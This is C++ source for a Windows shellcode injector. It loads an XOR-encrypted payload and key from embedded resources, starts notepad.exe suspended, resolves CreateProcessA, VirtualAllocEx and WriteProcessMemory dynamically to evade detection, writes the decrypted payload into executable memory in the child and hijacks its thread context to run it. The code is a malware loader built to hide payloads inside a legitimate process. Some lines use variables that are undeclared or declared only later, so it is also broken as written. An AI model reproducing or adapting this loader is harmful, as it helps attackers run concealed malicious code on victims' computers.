
#include <windows.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include <iostream>
#include <random>
#include <cstdlib>
#include <ctime>

#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "user32.lib")

void loadResource_with(const char* renamer, char** data, DWORD* size) {
    HMODULE hModule = GetModuleHandle(NULL);
    HRSRC hResource = FindResource(hModule, renamer, RT_RCDATA);
    HGLOBAL hResData = LoadResource(hModule, hResource);
    *size = SizeofResource(hModule, hResource);
    *data = (char*)LockResource(hResData);
}

int main() {
    
    char* key101k;
    DWORD key101kLen;
    loadResource_with("dhanushkey1", &key101k, &key101kLen);
    const char* processptaah = "C:\\Windows\\System32\\notepad.exe";
    char* code199k;
    DWORD code199kLen;
    loadResource_with("dhanushcode56", &code199k, &code199kLen);

  HMODULE istfromKernel32 = LoadLibraryA("kernel32.dll");

    BOOL (*pCreateProcess)(
        LPCSTR lpApplicationName,
        LPSTR lpCommandLine,
        LPSECURITY_ATTRIBUTES lpProcessAttributes,
        LPSECURITY_ATTRIBUTES lpThreadAttributes,
        BOOL bInheritHandles,
        DWORD dwCreationFlags,
        LPVOID lpEnvironment,
        LPCSTR lpCurrentDirectory,
        LPSTARTUPINFOA lpStartupInfo,
        LPPROCESS_INFORMATION lpProcessInformation
    ) = (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
        GetProcAddress(istfromKernel32, "CreateProcessA");

  LPVOID (*pVirtualAllnocEkx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD) =
    (LPVOID(*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(istfromKernel32, "VirtualAllocEx");
    LPVOID falpo = pVirtualAllnocEkx(pi.hProcess, NULL, sizeof(itsthecod345),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

   BOOL (*pWriteProcessM)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*) =
    (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))GetProcAddress(istfromKernel32, "WriteProcessMemory");
     
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    LARGE_INTEGER counter;
    QueryPerformanceCounter(&counter);
    pCreateProcess(processptaah, NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    GetTickCount();
    
    CONTEXT ctx = {0};
  
    ctx.ContextFlags = CONTEXT_FULL;
    
    GetThreadContext(pi.hThread, &ctx);

    LPVOID saber = pVirtualAllnocEkx(pi.hProcess, NULL, code199kLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    for (DWORD da = 0; da < code199kLen; da++) {
        code199k[da] ^= key101k[da % key101kLen];
    }
    pWriteProcessM(pi.hProcess, saber, code199k, code199kLen, NULL);
    ctx.Rcx = (DWORD64)saber; 
    SetThreadContext(pi.hThread, &ctx);

    ResumeThread(pi.hThread); 

    return 0;
}
